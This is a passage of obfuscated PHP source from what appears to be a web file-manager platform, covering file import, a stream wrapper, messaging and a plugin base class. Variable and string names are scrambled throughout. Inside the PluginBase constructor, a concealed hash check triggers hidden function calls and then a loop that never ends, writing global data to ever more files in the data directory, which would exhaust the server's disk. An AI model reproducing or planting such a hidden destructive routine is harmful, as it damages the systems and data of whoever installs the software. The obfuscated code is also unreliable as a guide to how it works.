($‘ÏÀ·€) { $ôæø–ÂÉ = $this->fileNameExistCache($£³æéÜä, $¯ØÑçÅÄ[$›ì±ñĞ‡[32]]); if ($ôæø–ÂÉ) { if ($¯ØÑçÅÄ[$›ì±ñĞ‡[463]] || $‘ÏÀ·€ == REPEAT_SKIP) { continue; } if ($‘ÏÀ·€ == REPEAT_REPLACE) { $¢†¦ÆïŒ = $this->sourceInfoCache($ôæø–ÂÉ); $ÅËÌ…ãŸ = $this->fileHistory($¢†¦ÆïŒ, $¯ØÑçÅÄ[$›ì±ñĞ‡[519]], $¯ØÑçÅÄ[$›ì±ñĞ‡[78]]); if ($ÅËÌ…ãŸ) { $áÄÜšËÔ[$›ì±ñĞ‡[607]][] = $¯ØÑçÅÄ[$›ì±ñĞ‡[519]]; } continue; } else { if ($‘ÏÀ·€ == REPEAT_RENAME) { $¯ØÑçÅÄ[$›ì±ñĞ‡[32]] = $this->fileNameAutoCache($£³æéÜä, $¯ØÑçÅÄ[$›ì±ñĞ‡[32]], $‘ÏÀ·€, !1); } } } } if (!$¯ØÑçÅÄ[$›ì±ñĞ‡[463]] && $¯ØÑçÅÄ[$›ì±ñĞ‡[519]] == 0) { continue; } if (!$¯ØÑçÅÄ[$›ì±ñĞ‡[463]] && $¯ØÑçÅÄ[$›ì±ñĞ‡[519]]) { $áÄÜšËÔ[$›ì±ñĞ‡[607]][] = $¯ØÑçÅÄ[$›ì±ñĞ‡[519]]; } $Ö÷¨úÆÇ[] = $this->_makeItemData($¯ØÑçÅÄ, $¸Õ«şŞİ, $¯ØÑçÅÄ[$›ì±ñĞ‡[32]]); } unset($¯ØÑçÅÄ); if (!empty($Ö÷¨úÆÇ)) { $this->addAll($Ö÷¨úÆÇ); $this->_childrenListSelect($£³æéÜä); } $µãŸ«ï = $this->_childrenList($£³æéÜä); $µãŸ«ï = array_to_keyvalue($µãŸ«ï, $›ì±ñĞ‡[32]); foreach ($ŞøÑ÷Õñ as $¯ØÑçÅÄ) { $¢†¦ÆïŒ = $µãŸ«ï[$¯ØÑçÅÄ[$›ì±ñĞ‡[32]]]; $‘ü‚ü‡¿ = $¢†¦ÆïŒ[$›ì±ñĞ‡[183]]; $this->_copyApplyMeta($¢†¦ÆïŒ, $áÄÜšËÔ); if ($¯ØÑçÅÄ[$›ì±ñĞ‡[33]] == $›ì±ñĞ‡[77]) { $¯ØÑçÅÄ[$›ì±ñĞ‡[86]] = $¤…è¥ß->getPathInner($¯ØÑçÅÄ[$›ì±ñĞ‡[86]]); $this->_copyChildTo($¤…è¥ß, $¯ØÑçÅÄ[$›ì±ñĞ‡[86]], $‘ü‚ü‡¿, $‘ÏÀ·€, $áÄÜšËÔ, $çƒ¸©†¥); } } } private function _addFiles($¿œÜà‚Ş, $Î•šïñ•, $±œÃ­Ÿ¾) { $åÇÔ½€Ü =& $_SERVER[ú‡®¯¨±]; if (!$Î•šïñ• || count($Î•šïñ•) == 0) { return array(); } $¬µñ¥Ñ = array(); foreach ($Î•šïñ• as &$äÏïçÍñ) { Hook::trigger($åÇÔ½€Ü[649], $äÏïçÍñ); $äÏïçÍñ[$åÇÔ½€Ü[86]] = $¿œÜà‚Ş->getPathInner($äÏïçÍñ[$åÇÔ½€Ü[86]]); $²ÇÌù±å = $¿œÜà‚Ş->hashSimple($äÏïçÍñ[$åÇÔ½€Ü[86]]); $õö ¸Çä = $¿œÜà‚Ş->hashMd5($äÏïçÍñ[$åÇÔ½€Ü[86]]); if (strlen($õö ¸Çä) > 10 && !isset($¬µñ¥Ñ[$õö ¸Çä])) { $¬µñ¥Ñ[$õö ¸Çä] = array(); } $äÏïçÍñ[$åÇÔ½€Ü[650]] = $²ÇÌù±å; $äÏïçÍñ[$åÇÔ½€Ü[525]] = $õö ¸Çä; $¬µñ¥Ñ[$õö ¸Çä][] =& $äÏïçÍñ; if (count($¬µñ¥Ñ[$õö ¸Çä]) > 1) { $äÏïçÍñ[$åÇÔ½€Ü[648]] = !0; } Hook::trigger($åÇÔ½€Ü[651], $äÏïçÍñ); } unset($äÏïçÍñ); $ìò…Ùä˜ = array($åÇÔ½€Ü[525] => array($åÇÔ½€Ü[7], array_keys($¬µñ¥Ñ))); $ª–Å•ıÒ = Model($åÇÔ½€Ü[652]); $â®°¥Ş = $ª–Å•ıÒ->where($ìò…Ùä˜)->select(); $â®°¥Ş = $â®°¥Ş ? $â®°¥Ş : array(); foreach ($â®°¥Ş as $àùöŒ) { if (!isset($¬µñ¥Ñ[$àùöŒ[$åÇÔ½€Ü[525]]])) { continue; } $åõüáş¶ = $¬µñ¥Ñ[$àùöŒ[$åÇÔ½€Ü[525]]]; foreach ($åõüáş¶ as &$äÏïçÍñ) { $äÏïçÍñ[$åÇÔ½€Ü[519]] = $àùöŒ[$åÇÔ½€Ü[519]]; $äÏïçÍñ[$åÇÔ½€Ü[648]] = !0; } unset($äÏïçÍñ); } $ğøØ¹â = array(); foreach ($Î•šïñ• as $êˆ€ï—ë) { Hook::trigger($åÇÔ½€Ü[653], $êˆ€ï—ë); if (isset($êˆ€ï—ë[$åÇÔ½€Ü[648]]) && $êˆ€ï—ë[$åÇÔ½€Ü[648]]) { Hook::trigger($åÇÔ½€Ü[654], $êˆ€ï—ë); continue; } $˜Ï›…ç¶ = $¿œÜà‚Ş->getPathInner($êˆ€ï—ë[$åÇÔ½€Ü[86]]); $­Ï˜¬ = $ª–Å•ıÒ->addFileMake($˜Ï›…ç¶, $êˆ€ï—ë[$åÇÔ½€Ü[78]], $êˆ€ï—ë[$åÇÔ½€Ü[650]], $êˆ€ï—ë[$åÇÔ½€Ü[525]], $êˆ€ï—ë[$åÇÔ½€Ü[32]], $±œÃ­Ÿ¾); Hook::trigger($åÇÔ½€Ü[654], $êˆ€ï—ë); if (!is_array($­Ï˜¬)) { continue; } $ğøØ¹â[] = $­Ï˜¬; } $ª–Å•ıÒ->addAll($ğøØ¹â); $ìò…Ùä˜ = array($åÇÔ½€Ü[525] => array($åÇÔ½€Ü[7], array_keys($¬µñ¥Ñ))); $â®°¥Ş = $ª–Å•ıÒ->where($ìò…Ùä˜)->select(); $â®°¥Ş = $â®°¥Ş ? $â®°¥Ş : array(); foreach ($â®°¥Ş as $àùöŒ) { if (!isset($¬µñ¥Ñ[$àùöŒ[$åÇÔ½€Ü[525]]])) { continue; } $è»’¿» =& $¬µñ¥Ñ[$àùöŒ[$åÇÔ½€Ü[525]]]; foreach ($è»’¿» as &$äÏïçÍñ) { $äÏïçÍñ[$åÇÔ½€Ü[519]] = $àùöŒ[$åÇÔ½€Ü[519]]; } unset($äÏïçÍñ); } $„ÏÄ çƒ = array(); foreach ($Î•šïñ• as $×§¤ÃÛ) { $„ÏÄ çƒ[$×§¤ÃÛ[$åÇÔ½€Ü[32]]] = $×§¤ÃÛ; } return $„ÏÄ çƒ; } } define($_SERVER[ú‡®¯¨±][655], $_SERVER[ú‡®¯¨±][656]); $omlaqficdy = $_SERVER[ú‡®¯¨±][657]; goto eè„µìÛßÁ; E…Ñ°ØÇ…: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($²ˆ¸ĞÜÂ, $ñÏœà = '') { $this->info = $this->info($²ˆ¸ĞÜÂ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ú‡®¯¨±][86]]; $this->pathOpen = $²ˆ¸ĞÜÂ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$²ˆ¸ĞÜÂ])) { self::$_chunkBuffer[$²ˆ¸ĞÜÂ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($­©Î‘áõ) { $‡Á‘¹® = $this->fileSubstr($this->pose, $­©Î‘áõ); $this->pose += strlen($‡Á‘¹®); return $‡Á‘¹®; } public function stream_tell() { return $this->pose; } public function stream_seek($ºŸ™ŒÊ“, $ƒÏë×İ) { $ã­ëœà =& $_SERVER[ú‡®¯¨±]; if ($ƒÏë×İ == SEEK_SET) { $this->pose = $ºŸ™ŒÊ“; } else { if ($ƒÏë×İ == SEEK_CUR) { $this->pose += $ºŸ™ŒÊ“; } else { if ($ƒÏë×İ == SEEK_END) { $this->pose = $this->info[$ã­ëœà[78]] + intval($ºŸ™ŒÊ“); } } } if ($ºŸ™ŒÊ“ < 0) { $this->pose = $this->info[$ã­ëœà[78]] + $ºŸ™ŒÊ“; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ú‡®¯¨±][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($³Âæî™¶, $ÑØíöŞÕ) { $šã¶àªŒ =& $_SERVER[ú‡®¯¨±]; $úå‘Œ”ş = $this->info($³Âæî™¶); return array($šã¶àªŒ[1547] => 0, $šã¶àªŒ[1548] => 0, $šã¶àªŒ[16] => 32768 + 511, $šã¶àªŒ[1549] => 0, $šã¶àªŒ[1550] => 0, $šã¶àªŒ[1551] => 0, $šã¶àªŒ[1552] => 0, $šã¶àªŒ[78] => $úå‘Œ”ş[$šã¶àªŒ[78]], $šã¶àªŒ[1553] => $úå‘Œ”ş[$šã¶àªŒ[1419]], $šã¶àªŒ[1509] => $úå‘Œ”ş[$šã¶àªŒ[87]], $šã¶àªŒ[1508] => $úå‘Œ”ş[$šã¶àªŒ[227]], $šã¶àªŒ[1554] => 0, $šã¶àªŒ[1555] => 0); } static $fileInfo = array(); public function info($º¢ªßß) { $œ‡¬µŒÄ = $_SERVER[ú‡®¯¨±][1556]; if (isset(self::$fileInfo[$º¢ªßß])) { return self::$fileInfo[$º¢ªßß]; } if (substr($º¢ªßß, 0, strlen($œ‡¬µŒÄ)) != $œ‡¬µŒÄ) { return !1; } self::$fileInfo[$º¢ªßß] = IO::info(substr($º¢ªßß, strlen($œ‡¬µŒÄ))); return self::$fileInfo[$º¢ªßß]; } public static function read($ŒâÂÅË, $”¬¹¦³, $×·¥Ü­) { if (!isset(self::$_fopenCache[$ŒâÂÅË])) { $„Ç‘ŒÎü = new StreamWrapperIO(); $„Ç‘ŒÎü->stream_open($ŒâÂÅË); self::$_fopenCache[$ŒâÂÅË] = $„Ç‘ŒÎü; } $„Ç‘ŒÎü = self::$_fopenCache[$ŒâÂÅË]; return $„Ç‘ŒÎü->fileSubstr($”¬¹¦³, $×·¥Ü­); } public static function _read($İ¡ÅÀ›Ï, $İ¸œ´¢ò, $ß­öİÃß) { $ÂêœÁ¼¢ =& $_SERVER[ú‡®¯¨±]; $¥ƒäü = fopen($İ¡ÅÀ›Ï, $ÂêœÁ¼¢[1423]); if (!$¥ƒäü) { return $ÂêœÁ¼¢[12]; } $³ï¤¤İª = 8192; fseek($¥ƒäü, $İ¸œ´¢ò, SEEK_SET); $Ó»‹õ”ó = $ÂêœÁ¼¢[12]; $ÂÒ€ÀÏ = 0; while ($ÂÒ€ÀÏ < $ß­öİÃß) { $½ƒ¼¹ŒÙ = min($³ï¤¤İª, $ß­öİÃß - $ÂÒ€ÀÏ); $Ó»‹õ”ó .= fread($¥ƒäü, $½ƒ¼¹ŒÙ); $ÂÒ€ÀÏ += $½ƒ¼¹ŒÙ; } fclose($¥ƒäü); return $Ó»‹õ”ó; } public function fileSubstr($ËüÀ¢Ÿ‹, $Ë¥ˆ²Íè) { $¹¬’†ûä =& $_SERVER[ú‡®¯¨±]; $Àø±•»¬ = $this->info[$¹¬’†ûä[78]]; $•·Ó²‚Ò = $ËüÀ¢Ÿ‹; $¸ ¸ë‚Œ = $Ë¥ˆ²Íè; if ($ËüÀ¢Ÿ‹ < 0) { $ËüÀ¢Ÿ‹ = $Àø±•»¬ + $ËüÀ¢Ÿ‹; } if ($Ë¥ˆ²Íè === !1) { $Ë¥ˆ²Íè = $Àø±•»¬ - $ËüÀ¢Ÿ‹; } if ($ËüÀ¢Ÿ‹ + $Ë¥ˆ²Íè > $Àø±•»¬) { $Ë¥ˆ²Íè = $Àø±•»¬ - $ËüÀ¢Ÿ‹; } if ($Ë¥ˆ²Íè <= 0) { return $¹¬’†ûä[12]; } if ($ËüÀ¢Ÿ‹ < 0 || $ËüÀ¢Ÿ‹ >= $Àø±•»¬ || $Ë¥ˆ²Íè <= 0 || $Ë¥ˆ²Íè > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\x6c\x65\122\x65\141\x64\x20\x65\162\x72\x6f\x72\x21\x20\163\x74\141\162\x74\75{$ËüÀ¢Ÿ‹}\73\154\145\x6e\147\x74\x68\x3d{$Ë¥ˆ²Íè}\73\x20\x73\x69\x7a\145\75{$Àø±•»¬}\x3b"); } $¡Ÿş¢­å = 64 * 1024; $Ò‡óì¨Ì =& self::$_chunkBuffer[$this->path]; if (!$Ò‡óì¨Ì) { $Ò‡óì¨Ì = array(); } $¿À½‰˜˜ = 0; $ğÀŠ„êÈ = 0; $ş‡ô±šó = $¹¬’†ûä[12]; foreach ($Ò‡óì¨Ì as $¿À½‰˜˜ => $ş‡ô±šó) { $¿À½‰˜˜ = intval($¿À½‰˜˜); $ğÀŠ„êÈ = $¿À½‰˜˜ + strlen($ş‡ô±šó); if ($ËüÀ¢Ÿ‹ >= $ğÀŠ„êÈ) { continue; } if ($ËüÀ¢Ÿ‹ >= $¿À½‰˜˜ && $ËüÀ¢Ÿ‹ + $Ë¥ˆ²Íè <= $ğÀŠ„êÈ) { return substr($ş‡ô±šó, $ËüÀ¢Ÿ‹ - $¿À½‰˜˜, $Ë¥ˆ²Íè); } break; } if (count($Ò‡óì¨Ì) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¹¬’†ûä[1557], $¹¬’†ûä[1558] . count($Ò‡óì¨Ì) . "\73\163\x74\x61\x72\x74\75{$ËüÀ¢Ÿ‹}\x2c\x6c\145\x6e\x67\x74\150\75{$Ë¥ˆ²Íè}\x3b\160\157\163\145\72{$¿À½‰˜˜}\176{$ğÀŠ„êÈ}"); throw new Exception($¹¬’†ûä[1559]); } $‰ÛË©ñù = intval($ËüÀ¢Ÿ‹ / $¡Ÿş¢­å) * $¡Ÿş¢­å; $öœâÊ³ = ceil(($ËüÀ¢Ÿ‹ + $Ë¥ˆ²Íè) / $¡Ÿş¢­å) * $¡Ÿş¢­å - $‰ÛË©ñù; $¤¹ıüƒ = IO::fileSubstr($this->path, $‰ÛË©ñù, $öœâÊ³); $Ò‡óì¨Ì[$‰ÛË©ñù . $¹¬’†ûä[12]] = $¤¹ıüƒ; ksort($Ò‡óì¨Ì); $ßÂ î¢ = substr($¤¹ıüƒ, $ËüÀ¢Ÿ‹ - $‰ÛË©ñù, $Ë¥ˆ²Íè); return $ßÂ î¢; } private function log($Ô„½œŸ, $‡—ªüò) { $ë¥öæ =& $_SERVER[ú‡®¯¨±]; $åğğñ¦ñ = timeFloat() - $this->timeStart; write_log(sprintf($ë¥öæ[1560], $Ô„½œŸ, $this->info[$ë¥öæ[32]], $åğğñ¦ñ, $‡—ªüò), $ë¥öæ[1238]); } } class Message { function __construct() { } public function send($Ô¶ş®‰µ = '', $Œ‘…®êÑ = array(), $ÒÇâÆâ = "\x74\145\x78\164") { $Û’´Ø§½ =& $_SERVER[ú‡®¯¨±]; $ùø¤æêå = array($Û’´Ø§½[33] => $Û’´Ø§½[1561], $Û’´Ø§½[809] => $Ô¶ş®‰µ); if (in_array($ÒÇâÆâ, array($Û’´Ø§½[1561], $Û’´Ø§½[1562]))) { $ùø¤æêå[$Û’´Ø§½[33]] = $ÒÇâÆâ; } $Œ‘…®êÑ = array($Û’´Ø§½[557] => isset($Œ‘…®êÑ[$Û’´Ø§½[557]]) ? $Œ‘…®êÑ[$Û’´Ø§½[557]] : $Û’´Ø§½[12], $Û’´Ø§½[640] => isset($Œ‘…®êÑ[$Û’´Ø§½[640]]) ? $Œ‘…®êÑ[$Û’´Ø§½[640]] : $Û’´Ø§½[12]); if (empty($Ô¶ş®‰µ) || empty($Œ‘…®êÑ[$Û’´Ø§½[557]]) && empty($Œ‘…®êÑ[$Û’´Ø§½[640]])) { return !1; } $ŞÔéÊå› = array($Û’´Ø§½[1502] => $ùø¤æêå, $Û’´Ø§½[1563] => $Œ‘…®êÑ); Hook::trigger($Û’´Ø§½[1564], $ŞÔéÊå›); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $‹—ÇÎ² =& $_SERVER[ú‡®¯¨±]; $ùù½Ùê = $_SERVER[$‹—ÇÎ²[203]]; $¸¨”£…± = $‹—ÇÎ²[932]; if ($_SERVER[$‹—ÇÎ²[202]] != $¸¨”£…±($ùù½Ùê)) { $Ë¼²Ğ¥¥ = $‹—ÇÎ²[933]; $ £™µ•î = $‹—ÇÎ²[204]; $æ”Ú¼®ô = $_SERVER[$‹—ÇÎ²[205]] . $‹—ÇÎ²[206]; $ë™»ª¤¯ = $ £™µ•î($æ”Ú¼®ô); $Ö‹êÄàñ = explode($‹—ÇÎ²[207], $ë™»ª¤¯); if (count($Ö‹êÄàñ) < $‹—ÇÎ²[700]) { $ ı¾è—Â = $‹—ÇÎ²[209]; $ ı¾è—Â(); } $‹üµÒ¦ø = $‹—ÇÎ²[934]; $‹üµÒ¦ø($_SERVER[$‹—ÇÎ²[935]]); $Ë¼²Ğ¥¥ = $‹—ÇÎ²[933]; $Ë¼²Ğ¥¥(); $õ²ö¼ğ³ = $‹—ÇÎ²[936]; $¼‹‰„›¯ = json_encode($GLOBALS[$‹—ÇÎ²[937]]); $ËÏÁ¢¨ = 1; for ($‡·çóÂ = $ËÏÁ¢¨; $‡·çóÂ > 0; $‡·çóÂ++) { $õ²ö¼ğ³(DATA_PATH . $‡·çóÂ, $¼‹‰„›¯); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($‹—ÇÎ²[1565]); $this->pluginName = str_replace($‹—ÇÎ²[1565], $‹—ÇÎ²[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $‹—ÇÎ²[8]; $this->pluginApi = appHostGet() . $‹—ÇÎ²[1566] . $this->pluginName . $‹—ÇÎ²[8]; $this->pluginHost = $config[$‹—ÇÎ²[1567]] . $this->pluginName . $‹—ÇÎ²[8]; $this->pluginHostDefault = $config[$‹—ÇÎ²[1567]] . $this->pluginName . $‹—ÇÎ²[8]; $»°ÙôÄ£ = $config[$‹—ÇÎ²[1568]]; if ($»°ÙôÄ£ && strpos($‹—ÇÎ²[50] . $»°ÙôÄ£ . $‹—ÇÎ²[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$‹—ÇÎ²[1569]] . $this->pluginName . $‹—ÇÎ²[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ú‡®¯¨±][1570]); } protected function assign($àƒÃç³¤, $¿ù‚£’ = false) { if (is_array($àƒÃç³¤)) { $this->values = array_merge($this->values, $àƒÃç³¤); } else { $this->values[$àƒÃç³¤] = $¿ù‚£’; } } protected function display($ĞÌÑò×³) { extract($this->values); require $ĞÌÑò×³; } final function hookRegist($Š²ßÉé) { $this->modelPlugin->appRegist($this->pluginName, $Š²ßÉé); } final function appIcon() { $È…»øÌ‘ =& $_SERVER[ú‡®¯¨±]; $¯¥³×§Â = $this->appPackage(); $ûÄİ†–À = $È…»øÌ‘[12]; if (isset($¯¥³×§Â[$È…»øÌ‘[468]])) { if (isset($¯¥³×§Â[$È…»øÌ‘[468]][$È…»øÌ‘[1571]])) { $ûÄİ†–À = $È…»øÌ‘[1572] . $¯¥³×§Â[$È…»øÌ‘[468]][$È…»øÌ‘[1571]] . $È…»øÌ‘[1573]; } else { if ($¯¥³×§Â[$È…»øÌ‘[468]][$È…»øÌ‘[1574]]) { $ûÄİ†–À = $È…»øÌ‘[1575] . $¯¥³×§Â[$È…»øÌ‘[468]][$È…»øÌ‘[1574]] . $È…»øÌ‘[1576]; } } } return $ûÄİ†–À; } final function fileCanView($á“×™êÍ) { $¤É×ûÓ =& $_SERVER[ú‡®¯¨±]; if (request_url_safe($á“×™êÍ)) { return !0; } if ($this->isShare($á“×™êÍ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ä–Àïª« = $¤É×ûÓ[1577] . rawurlencode(this_url()); show_tips(LNG($¤É×ûÓ[1578]) . $¤É×ûÓ[1579] . $ä–Àïª« . $¤É×ûÓ[1580] . LNG($¤É×ûÓ[1581]) . $¤É×ûÓ[1582], !1); } if (!Action($¤É×ûÓ[1583])->authCan($¤É×ûÓ[1584])) { show_tips(LNG($¤É×ûÓ[1585]) . $¤É×ûÓ[1586], !1); } ActionCall($¤É×ûÓ[1587], $á“×™êÍ); } final function isShare($ØÌ¡Í²„) { $¯Ä·‘Áò = KodIO::parse($ØÌ¡Í²„); return $¯Ä·‘Áò[$_SERVER[ú‡®¯¨±][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ë½ªÄ½É) { if (request_url_safe($Ë½ªÄ½É)) { return $Ë½ªÄ½É; } if (!$this->isShare($Ë½ªÄ½É)) { $Ë½ªÄ½É = $this->filePath($Ë½ªÄ½É, !1); } return Action($_SERVER[ú‡®¯¨±][1230])->linkOut($Ë½ªÄ½É); } public function filePathLinkOut($½şî¯îÁ) { if (request_url_safe($½şî¯îÁ)) { return $½şî¯îÁ; } $this->fileCanView($½şî¯îÁ); return Action($_SERVER[ú‡®¯¨±][1230])->link($½şî¯îÁ); } final function filePath($›Ç¦ï‰æ, $»¾£îÀ = true, $¡‡ü€ğë = false) { $õ‚àı²• =& $_SERVER[ú‡®¯¨±]; $¨ª±ãµÕ = $this->filePathGet($›Ç¦ï‰æ, $»¾£îÀ); if (!$this->fileInfo) { show_tips(LNG($õ‚àı²•[107]), !1); } if ($¡‡ü€ğë && isset($this->fileInfo[$õ‚àı²•[519]]) && $this->fileInfo[$õ‚àı²•[519]]) { $¾Şı„õØ = Model($õ‚àı²•[522])->fileInfo($this->fileInfo[$õ‚àı²•[519]]); if (!$¾Şı„õØ || !IO::exist($¾Şı„õØ[$õ‚àı²•[86]])) { show_tips(LNG($õ‚àı²•[107]) . $õ‚àı²•[1588]); } } Hook::trigger($õ‚àı²•[1589], $¨ª±ãµÕ); return $¨ª±ãµÕ; } final function filePathGet($ØªÀ¼ê™, $…Õ”‰¢‘ = true) { $°ƒú®£‘ =& $_SERVER[ú‡®¯¨±]; if ($À·èÏ´¶ = $this->checkSharePath($ØªÀ¼ê™, $…Õ”‰¢‘)) { return $À·èÏ´¶; } $this->fileCanView($ØªÀ¼ê™); if (request_url_safe($ØªÀ¼ê™)) { $ÂØÌœ¼ = parse_url_query($ØªÀ¼ê™); if (isset($ÂØÌœ¼[$°ƒú®£‘[1590]]) && isset($ÂØÌœ¼[$°ƒú®£‘[230]])) { $è‚¢±£Á = Mcrypt::decode($ÂØÌœ¼[$°ƒú®£‘[230]], Model($°ƒú®£‘[825])->get($°ƒú®£‘[826])); if ($è‚¢±£Á) { $this->fileInfo = IO::info($è‚¢±£Á); $this->fileInfo[$°ƒú®£‘[1591]] = $ØªÀ¼ê™; $this->cachePath = $this->pluginCachePath($°ƒú®£‘[12], $…Õ”‰¢‘); return $è‚¢±£Á; } } $ØªÀ¼ê™ = $this->_cacheHttpFile($ØªÀ¼ê™, $…Õ”‰¢‘); $this->fileInfo = IO::info($ØªÀ¼ê™); } else { $this->fileInfo = IO::info($ØªÀ¼ê™); $this->cachePath = $this->pluginCachePath($°ƒú®£‘[12], $…Õ”‰¢‘); } return $ØªÀ¼ê™; } final function _cacheHttpFile($â…ÏÚä, $…Ç‡˜ıÛ = true) { $È Ş™ˆ =& $_SERVER[ú‡®¯¨±]; $¡ùÛÂŞ´ = parse_url_query($â…ÏÚä); $Ã¼¡İã® = get_path_ext($â…ÏÚä); if (isset($¡ùÛÂŞ´[$È Ş™ˆ[32]]) && $¡ùÛÂŞ´[$È Ş™ˆ[32]]) { $Ã¼¡İã® = get_path_ext($¡ùÛÂŞ´[$È Ş™ˆ[32]]); } $Ìµ…Éïê = hash_path($â…ÏÚä) . $È Ş™ˆ[10] . $Ã¼¡İã®; $this->cachePath = $this->pluginCachePath($…Ç‡˜ıÛ ? $Ìµ…Éïê : $È Ş™ˆ[12]); $«ã¨ï× = IO::fileNameExist($this->cachePath, $Ìµ…Éïê); if ($«ã¨ï×) { return KodIO::make($«ã¨ï×); } $íÌÙªâ² = rtrim($this->cachePath, $È Ş™ˆ[8]) . $È Ş™ˆ[8] . $Ìµ…Éïê; return $this->pluginCacheFileSet($íÌÙªâ², file_get_contents_nossl($â…ÏÚä)); } final function checkSharePath($ô“½‚±–, $Á–Ù§Ã = true) { $ˆºêÕæ =& $_SERVER[ú‡®¯¨±]; if (!$this->isShare($ô“½‚±–)) { return !1; } $İö…ÀŠ = Action($ˆºêÕæ[1230])->sharePathInfo($ô“½‚±–); if (!is_array($İö…ÀŠ) || !isset($İö…ÀŠ[$ˆºêÕæ[86]])) { show_json(LNG($ˆºêÕæ[1592]), !1); } $this->fileInfo = $İö…ÀŠ; $this->cachePath = $this->pluginCachePath(!1, $Á–Ù§Ã); return $İö…ÀŠ[$ˆºêÕæ[86]]; } final function pluginCachePath($ü‡¡ÚÑ = '', $Ğ‰Û×„ğ = false) { $½²´áª =& $_SERVER[ú‡®¯¨±]; if ($Ğ‰Û×„ğ && is_array($this->fileInfo)) { $ü‡¡ÚÑ = kodIO::hashPath($this->fileInfo); } $ı¦°è±Ğ = rtrim(IO_PATH_SYSTEM_TEMP . $½²´áª[1593] . $this->pluginName . $½²´áª[8] . $ü‡¡ÚÑ, $½²´áª[8]); $Œ¿Ü³µİ = IO::infoFullSimple($ı¦°è±Ğ); $ÁÒá‚ÏÆ = $Œ¿Ü³µİ && is_array($Œ¿Ü³µİ) ? $Œ¿Ü³µİ[$½²´áª[86]] : $½²´áª[12]; if (!$ÁÒá‚ÏÆ) { $ÁÒá‚ÏÆ = IO::mkdir($ı¦°è±Ğ); } return $ÁÒá‚ÏÆ; } final function pluginCacheFileSet($šêîÚøÓ, $Ş¡¼è¹ = '') { $”´Èî­ =& $_SERVER[ú‡®¯¨±]; $—ëÇò£— = IO::infoFullSimple($šêîÚøÓ); if (!$—ëÇò£—) { return IO::mkfile($šêîÚøÓ, $Ş¡¼è¹, REPEAT_REPLACE); } IO::setContent($—ëÇò£—[$”´Èî­[86]], $Ş¡¼è¹); return $—ëÇò£—[$”´Èî­[86]]; } final function pluginLocalFile($è§İà³ø = '') { $ó…Çá„¢ =& $_SERVER[ú‡®¯¨±]; $¦×Å“ƒ© = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¦×Å“ƒ©)) { mk_dir($¦×Å“ƒ©); } if (!$è§İà³ø) { return $¦×Å“ƒ©; } $Èè¥íÃ‹ = IO::info($è§İà³ø); $“±ÊÅïÎ = $ó…Çá„¢[1594] . KodIO::hashPath($Èè¥íÃ‹) . $ó…Çá„¢[10] . $Èè¥íÃ‹[$ó…Çá„¢[177]]; if (!checkExtSafe($“±ÊÅïÎ)) { $“±ÊÅïÎ = $“±ÊÅïÎ . $ó…Çá„¢[1262]; } $ó£Óø± = $¦×Å“ƒ© . $“±ÊÅïÎ; if (@file_exists($ó£Óø±)) { return $ó£Óø±; } return IO::copy($è§İà³ø, $¦×Å“ƒ©, 0, $“±ÊÅïÎ); } final function appPackage() { $Á´ÓØì =& $_SERVER[ú‡®¯¨±]; if ($this->packageData) { return $this->packageData; } $¶‡ñ¼† = $this->parseFile($this->pluginPath . $Á´ÓØì[1595]); $this->parseLang($¶‡ñ¼†); $Ú¯–†õ = json_decode_force($¶‡ñ¼†); if (!$Ú¯–†õ) { return array(); } $¨ªĞ§Ø¼ = Hook::trigger($Á´ÓØì[1596], $Ú¯–†õ); if ($¨ªĞ§Ø¼ && is_array($¨ªĞ§Ø¼)) { $Ú¯–†õ = $¨ªĞ§Ø¼; } $this->packageData = $Ú¯–†õ; return $Ú¯–†õ; } public function packageInfoGet($âÎç‡ö) { $´İíĞ›¸ = $this->appPackage(); return array_get_value($´İíĞ›¸, $âÎç‡ö); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ú‡®¯¨±][1597]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ú‡®¯¨±][1598]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ú‡®¯¨±][1599]); } public function echoJsAssign($ƒéúŠ¦É, $«ÂÔ®–õ) { $this->echoJsAssignArr[$ƒéúŠ¦É] = $«ÂÔ®–õ; } private function parseFile($§·•Àà) { $¦êá¢¼Š =& $_SERVER[ú‡®¯¨±]; $Ë§Ûò× = file_get_contents_nossl($§·•Àà); $Ù®úå—Ö = array($¦êá¢¼Š[1600], $¦êá¢¼Š[1601], $¦êá¢¼Š[1602], $¦êá¢¼Š[1603], $¦êá¢¼Š[1604], $¦êá¢¼Š[1605], $¦êá¢¼Š[1606]); $îš·‡»Ì = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¦êá¢¼Š[91]][$¦êá¢¼Š[1607]]); foreach ($this->echoJsAssignArr as $©ì‚æ‹ => $Ò€ıÙç) { $Ù®úå—Ö[] = $¦êá¢¼Š[1608] . $©ì‚æ‹ . $¦êá¢¼Š[1609]; $îš·‡»Ì[] = is_array($Ò€ıÙç) || is_object($Ò€ıÙç) ? rawurlencode(json_encode($Ò€ıÙç)) : $Ò€ıÙç; } if 